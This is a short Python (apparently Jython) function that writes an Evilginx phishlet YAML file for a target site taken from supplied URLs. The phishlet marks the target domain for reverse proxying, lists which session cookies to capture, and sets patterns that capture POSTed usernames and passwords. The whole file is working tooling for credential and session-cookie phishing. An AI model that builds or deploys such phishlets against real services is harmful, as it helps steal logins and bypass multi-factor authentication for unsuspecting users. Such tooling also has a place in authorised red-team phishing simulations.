from urlparse import urlparse

def build_phishlet_yaml(urls, creds, cookies):
    """
    Build phishlet YAML per Evilginx spec.
    """
    # Normalize URLs to strings
    str_urls = []
    try:
        from java.net import URL
    except ImportError:
        URL = None
    for u in urls:
        if URL and isinstance(u, URL):
            str_urls.append(u.toString())
        else:
            str_urls.append(u)
    urls = str_urls

    if not urls:
        return "# No URLs provided"

    parsed = urlparse(urls[0])
    domain = parsed.hostname
    path = parsed.path or "/"

    lines = []
    lines.append("author: '@audibleblink'")
    lines.append("min_ver: '2.3.0'")
    lines.append("proxy_hosts:")
    lines.append("  - {phish_sub: '', orig_sub: '', domain: '%s', session: true, is_landing: true}" % domain)

    lines.append("")
    lines.append("sub_filters: []")

    lines.append("")
    lines.append("auth_tokens:")
    lines.append("  - domain: '.%s'" % domain)
    if cookies:
        lines.append("    keys: [%s]" % ", ".join("'%s'" % ck for ck in cookies))
    else:
        lines.append("    keys: []")

    lines.append("")
    if creds:
        lines.append("credentials:")
        if len(creds) > 0:
            lines.append("  username:")
            lines.append("    key: '%s'" % creds[0])
            lines.append("    search: '(.*)'")
            lines.append("    type: 'post'")
        if len(creds) > 1:
            lines.append("  password:")
            lines.append("    key: '%s'" % creds[1])
            lines.append("    search: '(.*)'")
            lines.append("    type: 'post'")
    else:
        lines.append("credentials: {}")

    lines.append("")
    lines.append("login:")
    lines.append("  domain: '%s'" % domain)
    lines.append("  path: '%s'" % path)

    return "\n".join(lines)